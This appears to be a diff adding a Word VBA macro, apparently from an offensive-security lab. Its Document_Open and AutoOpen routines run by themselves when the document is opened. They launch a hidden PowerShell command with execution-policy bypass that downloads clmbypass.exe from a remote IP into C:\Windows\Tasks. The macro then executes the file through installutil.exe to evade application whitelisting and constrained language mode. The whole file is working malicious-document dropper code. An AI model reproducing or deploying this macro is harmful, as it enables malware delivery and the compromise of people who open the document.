@@ -1,0 +1,25 @@
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell -ep bypass -c iwr -uri http://192.168.49.58/clmbypass.exe -outfile c:\Windows\Tasks\clmbypass.exe"
+    Shell str, vbHide
+    
+    Dim exePath As String
+    exePath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\Windows\Tasks\clmbypass.exe"
+    Shell exePath, vbHide
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+End Sub
